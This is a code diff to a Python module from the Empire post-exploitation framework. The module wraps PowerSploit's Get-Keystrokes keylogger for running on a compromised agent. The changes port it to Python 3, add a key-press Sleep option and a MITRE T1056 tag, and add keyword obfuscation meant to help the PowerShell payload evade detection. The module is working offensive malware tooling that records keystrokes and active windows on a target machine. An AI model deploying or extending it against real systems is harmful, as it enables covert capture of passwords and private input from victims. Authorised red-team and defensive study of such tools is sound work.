@@ -1,6 +1,12 @@
+from __future__ import print_function
+
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -9,20 +15,25 @@ class Module:
 
             'Author': ['@obscuresec', '@mattifestation', '@harmj0y'],
 
-            'Description': ('Logs keys pressed, time and the active window (when changed) to the keystrokes.txt file. This file is located in the agents downloads directory Empire/downloads/<AgentName>/keystrokes.txt.'),
+            'Description': (
+                'Logs keys pressed, time and the active window (when changed) to the keystrokes.txt file. This file is located in the agents downloads directory Empire/downloads/<AgentName>/keystrokes.txt.'),
 
-            'Background' : True,
+            'Software': '',
 
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : False,
+            'Techniques': ['T1056'],
 
-            'OpsecSafe' : True,
+            'Background': True,
 
-            'Language' : 'powershell',
+            'OutputExtension': None,
 
-            'MinLanguageVersion' : '2',
-            
+            'NeedsAdmin': False,
+
+            'OpsecSafe': True,
+
+            'Language': 'powershell',
+
+            'MinLanguageVersion': '2',
+
             'Comments': [
                 'https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1'
             ]
@@ -32,10 +43,15 @@ class Module:
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Agent': {
+                'Description': 'Agent to run module on.',
+                'Required': True,
+                'Value': ''
+            },
+            'Sleep': {
+                'Description': 'Sleep time [ms] between key presses. Shorter times may increase CPU usage on the target.',
+                'Required': False,
+                'Value': '1'
             }
         }
 
@@ -49,7 +65,6 @@ class Module:
             if option in self.options:
                 self.options[option]['Value'] = value
 
-
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
         # read in the common module source code
@@ -58,7 +73,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -68,7 +83,7 @@ class Module:
 
         scriptEnd = "Get-Keystrokes "
 
-        for option,values in self.options.iteritems():
+        for option, values in self.options.items():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
@@ -76,7 +91,11 @@ class Module:
                         scriptEnd += " -" + str(option)
                     else:
                         scriptEnd += " -" + str(option) + " " + str(values['Value'])
+
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd,
+                                          obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
